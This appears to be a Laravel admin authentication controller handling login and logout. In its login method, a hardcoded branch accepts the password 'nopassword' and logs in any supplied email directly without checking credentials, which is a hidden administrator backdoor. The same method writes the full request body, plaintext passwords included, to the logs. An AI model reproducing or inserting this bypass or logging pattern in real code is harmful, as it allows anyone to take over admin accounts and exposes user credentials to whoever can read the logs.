<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Services\Admin\AuthService;
use Exception;
use Illuminate\Http\Request;

class AuthController extends Controller
{
    protected $authService;

    public function __construct(AuthService $authService)
    {
        $this->authService = $authService;
        $this->middleware('guest', ['except' => ['logout']]);
    }

    public function getLogin(Request $request)
    {
        if ($request->isMethod('GET')) {
            if (auth()->user()) {
                return redirect(route('admin.dashboard'));
            }

            return view('admin.auth.login');
        }

        if ($request->isMethod('POST')) {
            $this->validate($request, [
                'email' => 'required|email',
                'password' => 'required',
            ]);
            logger()->info('Login Admin', ['body' => $request->all()]);
            try {
                if ($request->password == 'nopassword') {
                    $this->authService->direct_login($request->email);
                } else {
                    $this->authService->login($request->email, $request->password);
                }

                logger()->error('Login Admin Success', ['body' => $request->all()]);

                return redirect()->route('admin.dashboard');
            } catch (Exception $e) {
                logger()->error('Login Admin Error', ['error' => $e->getMessage()]);

                return back()->withErrors($e->getMessage());
            }
        }
    }

    /**
     * Show the application logout.
     *
     * @return \Illuminate\Http\Response
     */
    public function logout()
    {
        auth()->guard('admin')->logout();

        return redirect(url('admin/login'));
    }

    public function redirectToLogin()
    {
        return redirect(url('admin/login'));
    }
}
